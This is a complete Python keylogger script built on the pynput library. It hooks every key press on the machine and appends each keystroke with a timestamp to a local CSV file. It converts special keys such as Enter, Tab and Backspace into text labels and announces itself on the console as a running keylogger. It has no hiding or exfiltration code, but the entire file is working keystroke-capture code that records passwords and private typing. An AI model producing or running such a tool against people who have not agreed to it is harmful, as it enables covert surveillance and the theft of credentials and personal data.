from pynput.keyboard import Listener, Key
from datetime import datetime
import csv

CSV_FILE = "keylogs.csv"

try:
    with open(CSV_FILE, "x", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Timestamp", "Key"])
except FileExistsError:
    pass  # File already exists
def write_to_csv(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")


    try:
        if key == Key.space:
            key = '[SPACE]' + ' '
        elif key == Key.enter:
            key = '[ENTER]\n'
        elif key == Key.tab:
            key = '[TAB]\t'
        elif key == Key.backspace:
             key = '[BACKSPACE]'
        elif hasattr(key, 'char') and key.char is not None:
            key = key.char  # No quotes here — it's already a string
        else:
            key = f'[{key.name.upper()}]'  # Handles shift, ctrl, etc.
        
        print(f"CAPTURED: {key}")

        with open(CSV_FILE, "a", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, key])

    except Exception as e:
            print(f"Error: {e}") 


with Listener(on_press=write_to_csv) as l:
           print("THE KEYLOGGER IS RUNNING, PRESS AWAY")
           l.join()

